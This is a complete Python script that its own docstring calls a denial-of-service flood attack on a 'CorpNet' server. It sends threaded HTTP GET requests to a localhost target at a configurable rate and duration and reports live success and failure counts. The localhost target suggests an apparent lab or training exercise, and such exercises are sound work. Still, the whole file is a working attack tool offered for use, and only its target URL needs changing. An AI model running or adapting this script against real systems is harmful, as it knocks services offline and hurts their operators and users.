#!/usr/bin/env python3
"""
DoS (Denial-of-Service) flood script against the CorpNet target server.

Usage:
    python dos_attack.py [--rate 50] [--duration 30] [--threads 5]
"""

import argparse
import sys
import threading
import time

import requests

TARGET_URL = "http://localhost:5001/"


class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.sent = 0
        self.success = 0
        self.failed = 0

    def record(self, ok: bool) -> None:
        with self._lock:
            self.sent += 1
            if ok:
                self.success += 1
            else:
                self.failed += 1

    def snapshot(self) -> tuple[int, int, int]:
        with self._lock:
            return self.sent, self.success, self.failed


def worker(stats: Stats, stop_event: threading.Event, rate_per_thread: float) -> None:
    interval = 1.0 / rate_per_thread if rate_per_thread > 0 else 0
    session = requests.Session()
    while not stop_event.is_set():
        t0 = time.time()
        try:
            resp = session.get(TARGET_URL, timeout=3)
            stats.record(resp.status_code < 500)
        except requests.RequestException:
            stats.record(False)
        elapsed = time.time() - t0
        sleep_for = max(0.0, interval - elapsed)
        if sleep_for:
            time.sleep(sleep_for)


def main():
    parser = argparse.ArgumentParser(description="DoS flood attack against CorpNet")
    parser.add_argument("--rate", type=int, default=50,
                        help="Total requests per second (default: 50)")
    parser.add_argument("--duration", type=int, default=30,
                        help="Attack duration in seconds (default: 30)")
    parser.add_argument("--threads", type=int, default=5,
                        help="Number of worker threads (default: 5)")
    args = parser.parse_args()

    rate_per_thread = max(1, args.rate // args.threads)
    stats = Stats()
    stop_event = threading.Event()

    print(f"\n[DoS] Target   : {TARGET_URL}")
    print(f"[DoS] Rate     : ~{args.rate} req/s  ({args.threads} threads × {rate_per_thread} req/s)")
    print(f"[DoS] Duration : {args.duration}s")
    print("-" * 60)

    threads = [
        threading.Thread(target=worker, args=(stats, stop_event, rate_per_thread), daemon=True)
        for _ in range(args.threads)
    ]
    for t in threads:
        t.start()

    start = time.time()
    try:
        for tick in range(1, args.duration + 1):
            time.sleep(1)
            sent, success, failed = stats.snapshot()
            elapsed = time.time() - start
            print(f"[t={tick:>3}s] Sent: {sent:>6} requests | "
                  f"Success: {success:>6} | Failed: {failed:>4}")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=2)

    sent, success, failed = stats.snapshot()
    duration = time.time() - start
    print("-" * 60)
    print(f"[DoS] Attack complete — {sent} total requests in {duration:.1f}s "
          f"({sent / duration:.1f} req/s avg)")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
